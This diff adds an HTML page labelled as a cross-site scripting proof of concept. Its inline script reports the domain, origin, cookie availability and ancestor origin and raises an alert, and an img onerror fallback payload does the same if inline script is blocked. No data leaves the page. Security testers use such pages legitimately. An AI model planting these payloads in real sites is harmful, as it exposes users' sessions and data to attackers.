@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>XSS PoC</title>
+</head>
+<body>
+<h1>XSS Proof of Concept</h1>
+<p id="result">Loading...</p>
+
+<script>
+  document.title = "XSS-EXECUTED";
+  document.getElementById('result').innerText =
+    "XSS executed | domain: " + document.domain +
+    " | origin: " + window.location.origin +
+    " | cookies accessible: " + (document.cookie.length > 0 ? "yes" : "no/empty") +
+    " | ancestor origin: " + (window.location.ancestorOrigins && window.location.ancestorOrigins.length ? window.location.ancestorOrigins[0] : "n/a (Firefox has no ancestorOrigins)");
+  alert('XSS: ' + document.domain);
+</script>
+
+<!-- Fallback vector in case inline <script> is ever stripped/blocked -->
+<img src="x" onerror="document.title='XSS-EXECUTED-IMG'; alert('XSS via onerror: ' + document.domain)">
+</body>
+</html>
